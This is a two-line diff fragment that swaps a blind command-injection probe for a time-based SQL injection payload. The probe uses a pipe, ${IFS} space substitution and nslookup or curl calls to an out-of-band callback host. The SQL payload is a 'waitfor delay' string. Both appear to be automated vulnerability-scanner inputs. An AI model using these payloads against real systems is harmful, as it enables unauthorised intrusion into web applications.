@@ -1,1 +1,1 @@
-|(nslookup${IFS}-q${IFS}cname${IFS}hitftyxilcyhqe1f9e.bxss.me||curl${IFS}hitftyxilcyhqe1f9e.bxss.me)
+555-1 waitfor delay '0:0:15' -- 
